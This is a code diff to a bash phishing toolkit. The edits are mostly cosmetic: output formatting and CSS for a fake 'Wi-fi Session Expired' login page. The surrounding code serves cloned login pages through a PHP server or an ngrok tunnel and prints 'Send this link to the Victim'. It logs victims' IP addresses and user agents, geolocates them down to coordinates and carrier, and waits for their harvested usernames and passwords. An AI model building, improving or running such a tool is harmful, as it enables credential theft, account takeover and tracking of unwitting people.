@@ -206,15 +206,15 @@ catch_ip() {
     ip=$(grep -a 'IP:' sites/$website/ip.txt | cut -d " " -f2 | tr -d '\r')
     IFS=$'\n'
     ua=$(grep 'User-Agent:' sites/$website/ip.txt | cut -d '"' -f2)
-    printf "${GREEN}[-]${ORANGE} Victim IP:${GREEN} %s\e[0m\n" $ip
-    printf "${GREEN}[-]${ORANGE} User-Agent:${GREEN} %s\e[0m\n" $ua
-    printf "${GREEN}[-]${ORANGE} Saved:${GREEN} %s/saved.ip.txt\e[0m\n" $website
+    printf "${GREEN}[-]${ORANGE} Victim IP:${GREEN} %s\n" $ip
+    printf "${GREEN}[-]${ORANGE} User-Agent:${GREEN} %s\n" $ua
+    printf "${GREEN}[-]${ORANGE} Saved:${GREEN} %s/saved.ip.txt\n" $website
     cat sites/$website/ip.txt >> sites/$website/saved.ip.txt
     ip_location
 }
 
 getcredentials() {
-    printf "${RED}Waiting credentials ...\e[0m\n"
+    printf "${RED}Waiting credentials ...\n"
     while [ true ]; do
 
     if [[ -e "sites/$website/usernames.txt" ]]; then
@@ -253,19 +253,19 @@ ip_location() {
     userisp=$(echo $ipaddripapico | grep -Po '(?<="org":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
     usercalling=$(echo $ipaddripapico | grep -Po '(?<="country_calling_code":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
     printf "${CYAN} Victim IP Details ....\n"
-    printf "${RED}..........................................................................................\n"
+    printf "${RED}-----------------------------------------------------------------------\n"
     printf "\n"
-    printf "  ${ORANGE}  City >>         ${GREEN}   $usercity\n"
-    printf "  ${ORANGE}  Region >>       ${GREEN}   $useregion\n"
-    printf "  ${ORANGE}  Country >>      ${GREEN}   $usercountry\n"
-    printf "  ${ORANGE}  Latitude >>     ${GREEN}    $userlat\n"
-    printf "  ${ORANGE}  Longitude >>    ${GREEN}    $userlon\n"
-    printf "  ${ORANGE}  Time Zone >>    ${GREEN}    $usertime\n"
-    printf "  ${ORANGE}  Postal Code >>  ${GREEN}    $userpostal\n"
-    printf "  ${ORANGE}  Carrier >>      ${GREEN}   $userisp\n"
-    printf "  ${ORANGE}  Calling Code >> ${GREEN}   $usercalling\n"
-    printf "  ${ORANGE}  Google Location >> ${CYAN} https://maps.google.com/?q=$userlat,$userlon\e[0m\n"
-    printf "${RED}..........................................................................................\n"
+    printf "  ${ORANGE}  City            >>         ${GREEN}   $usercity\n"
+    printf "  ${ORANGE}  Region          >>       ${GREEN}   $useregion\n"
+    printf "  ${ORANGE}  Country         >>      ${GREEN}   $usercountry\n"
+    printf "  ${ORANGE}  Latitude        >>     ${GREEN}    $userlat\n"
+    printf "  ${ORANGE}  Longitude       >>    ${GREEN}    $userlon\n"
+    printf "  ${ORANGE}  Time Zone       >>    ${GREEN}    $usertime\n"
+    printf "  ${ORANGE}  Postal Code     >>  ${GREEN}    $userpostal\n"
+    printf "  ${ORANGE}  Carrier         >>      ${GREEN}   $userisp\n"
+    printf "  ${ORANGE}  Calling Code    >> ${GREEN}   $usercalling\n"
+    printf "  ${ORANGE}  Google Location >> ${CYAN} https://maps.google.com/?q=$userlat,$userlon\n"
+    printf "${RED}-----------------------------------------------------------------------\n"
     getcredentials
 }
 
@@ -278,16 +278,16 @@ start() {
     rm -rf sites/$website/usernames.txt
 
     fi
-    printf "${GREEN}[1]${ORANGE}Localhost\n"
-    printf "${GREEN}[2]${ORANGE}Ngrok\n"
+    printf "${GREEN}[1]${ORANGE} Localhost\n"
+    printf "${GREEN}[2]${ORANGE} Ngrok\n"
     printf "\n"
-    read -p "${GREEN}[+]${YELLOW}Tunnel Option -->> " tunnel
+    read -p "${GREEN}[+]${YELLOW} Tunnel Option -->> " tunnel
     if [[ $tunnel == 1 ]]; then
-    printf "${RED}[#]${BLUE} Starting php server ...\n"
+    printf "${RED}[&]${BLUE} Starting php server ...\n"
     cd sites/$website && php -S 127.0.0.1:3333 > /dev/null 2>&1 &
     sleep 2
 
-    printf "${RED}### ${YELLOW}Send this link to the Victim: ${CYAN} http://127.0.0.1:3333 \n" 
+    printf "${RED}(*) ${YELLOW}Send this link to the Victim: ${CYAN} http://127.0.0.1:3333 \n" 
     checkfound 
     elif [[ $tunnel == 2 ]]; then
     tunnel
@@ -321,26 +321,26 @@ tunnel() {
     chmod +x ngrok
     rm -rf ngrok-stable-linux-386.zip
     else
-    printf "${GREEN}[!]${RED}Download error... \e[0m\n"
+    printf "${GREEN}[!]${RED}Download error... \n"
     exit 1
     fi
     fi
     fi
 
-    printf "${RED}[#]${BLUE} Starting php server ...\n"
+    printf "${RED}[&]${BLUE} Starting php server ...\n"
     cd sites/$website && php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
     sleep 2
-    printf "${RED}[#]${BLUE} Starting ngrok server ...\n"
+    printf "${RED}[&]${BLUE} Starting ngrok server ...\n"
     ./ngrok http 3333 > /dev/null 2>&1 &
     sleep 10
 
     link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io")
-    printf "${RED}### ${YELLOW}Send this link to the Victim: ${CYAN} %s \n" $link
+    printf "${RED}(*) ${YELLOW}Send this link to the Victim: ${CYAN} %s \n" $link
     printf "\n"
     checkfound
 }
 checkfound() {
-    printf "${ORANGE}Waiting victim open the link ...\e[0m\n"
+    printf "${ORANGE}Waiting victim open the link ...\n"
     while [ true ]; do
 
     if [[ -e "sites/$website/ip.txt" ]]; then
@@ -358,19 +358,19 @@ createpage() {
     default_pass_text="Password:"
     default_sub_text="Log-In"
 
-    read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Title 1 (Default: Wi-fi Session Expired): \e[0m' cap1
+    read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Title 1 (Default: Wi-fi Session Expired): ' cap1
     cap1="${cap1:-${default_cap1}}"
 
-    read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Title 2 (Default: Please login again.): \e[0m' cap2
+    read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Title 2 (Default: Please login again.): ' cap2
     cap2="${cap2:-${default_cap2}}"
 
-    read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Username field (Default: Username:): \e[0m' user_text
+    read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Username field (Default: Username:): ' user_text
     user_text="${user_text:-${default_user_text}}"
 
-    read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Password field (Default: Password:): \e[0m' pass_text
+    read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Password field (Default: Password:): ' pass_text
     pass_text="${pass_text:-${default_pass_text}}"
 
-    read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Submit field (Default: Log-In): \e[0m' sub_text
+    read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Submit field (Default: Log-In): ' sub_text
     sub_text="${sub_text:-${default_sub_text}}"
 
 
@@ -387,14 +387,18 @@ createpage() {
     echo	"border: 1px solid gray;" >> sites/custom/login.html
     echo	"border-radius: 4px;" >> sites/custom/login.html
     echo	"margin: 3px;" >> sites/custom/login.html
+    echo    "border-bottom: 2px solid gray;" >> sites/custom/login.html
+    echo    "input:focus {" >> sites/custom/login.html
+	echo    "border-bottom: 3px solid #0052cc;" >> sites/custom/login.html
     echo	"}" >> sites/custom/login.html
     echo "</style>" >> sites/custom/login.html
     echo "<style>" >> sites/custom/login.html
     echo "button {" >> sites/custom/login.html
-    echo	"background-color: white;" >> sites/custom/login.html
-    echo	"color: black;" >> sites/custom/login.html
-    echo	"border: 1px solid black;" >> sites/custom/login.html
-    echo	"padding: 1px 18px;" >> sites/custom/login.html
+    echo	"border: none;" >> sites/custom/login.html
+    echo	"padding: 1px 50px;" >> sites/custom/login.html
+    echo	"background-color: #404040;" >> sites/custom/login.html
+    echo	"color: white;" >> sites/custom/login.html
+    echo    "border-radius: 20px;" >> sites/custom/login.html
     echo	"}" >> sites/custom/login.html
     echo "</style>" >> sites/custom/login.html
     echo "<form method="POST" action="login.php">" >> sites/custom/login.html
